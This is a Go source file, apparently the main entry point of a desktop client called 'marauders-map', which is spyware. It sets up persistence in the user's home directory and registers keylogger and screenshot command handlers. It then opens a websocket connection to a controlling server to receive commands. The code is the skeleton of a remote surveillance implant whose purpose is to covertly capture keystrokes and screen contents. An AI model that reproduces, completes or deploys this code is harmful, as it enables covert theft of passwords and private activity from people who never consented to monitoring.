package main

import (
	"marauders-map-client-desktop/internal/deploy"
	"marauders-map-client-desktop/internal/screen"
	"marauders-map-client-desktop/internal/wsclient"
	"marauders-map-client-desktop/internal/wsclient/observer"
)

func main() {

	// Deploy for persistence
	// this setups home directory folder for the program
	// folder strcuture & persist mechanism
	deploy.Deploy()

	// TODO: delete this
	// ch := make(chan *screen.Screenshot)
	// recorder := screen.NewScreenRecorder(5)
	// recorder.StartCapturing(ch)

	// for {
	// 	shot := <-ch
	// 	log.Println("Shot received: ", shot.FileName)
	// 	log.Printf("Shot name: (%s) %s\n", shot.FileGroup, shot.FileName)
	// 	log.Println("Shot path:", shot.FilePath)
	// }

	// Observer for processing incoming
	// commands from server
	screenrecorder := screen.NewScreenRecorder(5)
	subject := &observer.Subject{}
	subject.AddListener(observer.NewKeyloggerCmdObserver())
	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))

	// Start connection and communication with server
	// Subject with Observers is passed as parameter
	// for processing commands
	wsclient.StartCommunications(subject)

}
